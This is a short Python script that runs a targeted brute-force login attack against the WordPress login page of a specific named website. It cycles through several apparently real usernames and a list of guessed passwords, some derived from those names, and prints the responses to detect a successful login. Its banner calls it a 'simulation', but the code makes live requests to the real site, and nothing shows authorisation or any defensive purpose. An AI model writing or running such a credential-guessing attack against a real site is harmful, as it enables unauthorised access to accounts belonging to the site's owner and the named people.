import urllib.request
import urllib.parse
import concurrent.futures
import time

target_url = "https://galeriundanganofficial.com/wp-login.php"
usernames = ["editgaleri", "guofficial", "ratna", "riski"]
passwords = ["admin", "password", "123456", "galeri", "official", "jakarta", "password123", "editgaleri2026", "ratna123", "riski123"]

print("=== TARGETED BRUTE-FORCE SIMULATION ON galeriundanganofficial.com ===")

def test_login(user, pwd):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = urllib.parse.urlencode({
        'log': user,
        'pwd': pwd,
        'wp-submit': 'Log In',
        'redirect_to': 'https://galeriundanganofficial.com/wp-admin/',
        'testcookie': '1'
    }).encode('utf-8')
    
    try:
        req = urllib.request.Request(target_url, data=data, headers=headers, method='POST')
        res = urllib.request.urlopen(req, timeout=5)
        # Check if login succeeded (redirect or cookie set)
        print(f"[User: {user} | Pwd: {pwd}] -> Status: {res.status}, URL: {res.url}")
    except Exception as e:
        print(f"[User: {user} | Pwd: {pwd}] -> Error: {e}")

for u in usernames:
    print(f"\n--- Testing User: {u} ---")
    for p in passwords:
        test_login(u, p)
        time.sleep(0.1)
